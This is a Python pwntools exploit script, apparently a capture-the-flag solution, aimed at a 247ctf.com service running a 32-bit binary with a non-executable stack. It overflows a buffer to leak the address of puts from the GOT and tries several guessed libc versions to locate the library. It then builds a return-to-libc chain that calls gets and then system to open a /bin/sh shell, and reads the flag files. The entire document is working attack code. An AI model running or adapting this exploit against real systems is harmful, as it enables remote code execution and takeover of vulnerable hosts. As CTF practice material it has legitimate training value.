#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'error'

elf = ELF('./non_executable_stack', checksec=False)

puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
main_addr = elf.symbols['main']
puts_got = elf.got['puts']
bss_addr = elf.bss() + 0x100

# Common libc offsets for 32-bit
libc_versions = [
    ('libc6_2.27', 0x67360, 0x3ada0),
    ('libc6_2.31', 0x6f360, 0x3cd80),
    ('libc6_2.23', 0x5f140, 0x3ada0),
    ('libc6_2.28', 0x67360, 0x3ada0),
    ('libc6_2.29', 0x67360, 0x3cd80),
    ('libc6_2.30', 0x6f360, 0x3cd80),
]

offset = 44

for lib_name, puts_offset, system_offset in libc_versions:
    try:
        print(f"\n[*] Trying {lib_name} (puts:{hex(puts_offset)}, system:{hex(system_offset)})")
        
        host, port = '44a148766800f366.247ctf.com', 50150
        p = remote(host, port, level='error')
        
        # Leak puts
        p.recvline()
        payload1 = b'A' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
        p.sendline(payload1)
        p.recvline()
        puts_leak = u32(p.recv(4))
        
        # Calculate addresses
        libc_base = puts_leak - puts_offset
        system_addr = libc_base + system_offset
        
        print(f"[*] Leaked puts: {hex(puts_leak)}")
        print(f"[*] Libc base: {hex(libc_base)}")
        print(f"[*] System: {hex(system_addr)}")
        
        # Exploit
        p.recvline()
        payload2 = b'A' * offset
        payload2 += p32(gets_plt)
        payload2 += p32(system_addr)
        payload2 += p32(bss_addr)
        payload2 += p32(0)
        payload2 += p32(bss_addr)
        
        p.sendline(payload2)
        p.recvline()
        p.sendline(b'/bin/sh\x00')
        
        # Test shell
        p.sendline(b'echo PWNED')
        try:
            response = p.recvline(timeout=2).decode()
            if 'PWNED' in response:
                print(f"[+] SUCCESS with {lib_name}!")
                p.sendline(b'cat flag*')
                print(p.recvall(timeout=2).decode())
                p.close()
                break
        except:
            pass
        
        p.close()
        
    except Exception as e:
        print(f"[-] Failed: {e}")
        continue

print("\n[*] Done")
